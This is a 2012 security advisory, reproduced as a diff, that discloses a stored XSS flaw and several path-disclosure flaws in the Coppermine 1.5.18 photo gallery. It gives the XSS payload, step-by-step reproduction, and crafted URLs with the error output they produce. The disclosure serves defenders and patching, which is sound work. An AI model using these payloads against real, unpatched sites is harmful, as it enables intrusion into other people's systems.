@@ -1,0 +1,151 @@
+[waraxe-2012-SA#081] - Multiple Vulnerabilities in Coppermine 1.5.18
+==============================================================================
+
+Author: Janek Vind "waraxe"
+Date: 29. March 2012
+Location: Estonia, Tartu
+Web: http://www.waraxe.us/advisory-81.html
+
+
+Affected Software:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Coppermine is a multi-purpose fully-featured and integrated web picture gallery
+script written in PHP using GD or ImageMagick as image library with a MySQL backend.
+
+http://coppermine-gallery.net/
+
+
+Affected versions
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Tests were conducted against Coppermine version 1.5.18.
+
+###############################################################################
+1. Stored XSS in picture keywords
+###############################################################################
+
+Reason: failure to sufficiently sanitize user-supplied input data
+Preconditions: privileges needed for picture keywords editing
+
+Coppermine user with appropriate privileges is able to modify picture information:
+
+http://localhost/cpg1518/edit_one_pic.php?id=1&what=picture
+
+There is a field in form named as "Keywords (separate with semicolon)".
+After insertion to database those keywords are later used in html meta section.
+It appears, that specific user supplied data is not properly validated before
+outputting as html to the end user, resulting in Stored XSS vulnerability.
+
+Testing:
+
+1. Open picture information editing page:
+
+http://localhost/cpg1518/edit_one_pic.php?id=1&what=picture
+
+2. Insert XSS payload below as keywords and click "Apply changes":
+
+"><body onload=javascript:alert(String.fromCharCode(88,83,83))>
+
+After that issue request to view this image:
+
+http://localhost/cpg1518/displayimage.php?pid=1
+
+As result we can observe XSS payload execution.
+
+
+###############################################################################
+2. Path Disclosure in "visiblehookpoints" plugin
+###############################################################################
+
+Test:
+
+http://localhost/cpg1518/plugins/visiblehookpoints/index.php
+
+Result:
+
+Warning: require_once(include/init.inc.php) [function.require-once]:
+failed to open stream: No such file or directory in
+C:\apache_www\cpg1518\plugins\visiblehookpoints\index.php on line 22
+
+Fatal error: require_once() [function.require]:
+Failed opening required 'include/init.inc.php' (include_path='.;C:\php\pear') in
+C:\apache_www\cpg1518\plugins\visiblehookpoints\index.php on line 22
+
+
+###############################################################################
+3. Path Disclosure in "thumbnails.php"
+###############################################################################
+
+Attack vector: user submitted GET parameters "page" and "cat"
+
+Tests:
+
+http://localhost/cpg1518/thumbnails.php?page[]
+http://localhost/cpg1518/thumbnails.php?cat[]
+
+Results:
+
+Fatal error: Unsupported operand types in
+C:\apache_www\cpg1518\include\functions.inc.php on line 2980
+
+Fatal error: Unsupported operand types in
+C:\apache_www\cpg1518\thumbnails.php on line 160
+
+
+
+###############################################################################
+4. Path Disclosure in "usermgr.php"
+###############################################################################
+
+Attack vector: user submitted GET parameter "page"
+Preconditions: admin privileges needed
+
+Test:
+
+http://localhost/cpg1518/usermgr.php?page[]
+
+Result:
+
+Fatal error: Unsupported operand types in
+C:\apache_www\cpg1518\usermgr.php on line 185
+
+
+###############################################################################
+5. Path Disclosure in "search.inc.php"
+###############################################################################
+
+Attack vector: user submitted GET parameters "newer_than" and "older_than"
+
+Tests:
+
+http://localhost/cpg1518/thumbnails.php?search=1&album=search&newer_than[]
+http://localhost/cpg1518/thumbnails.php?search=1&album=search&older_than[]
+
+Results:
+
+Fatal error: Unsupported operand types in
+C:\apache_www\cpg1518\include\search.inc.php on line 106
+
+Fatal error: Unsupported operand types in
+C:\apache_www\cpg1518\include\search.inc.php on line 107
+
+
+Disclosure Timeline:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+27.03.2012 Developers contacted via email
+29.03.2012 Developers released patched version 1.5.20
+29.03.2012 Public disclosure
+
+
+Contact:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+come2waraxe@yahoo.com
+Janek Vind "waraxe"
+
+Waraxe forum:  http://www.waraxe.us/forums.html
+Personal homepage: http://www.janekvind.com/
+Random project: http://albumnow.com/
+---------------------------------- [ EOF ] ------------------------------------
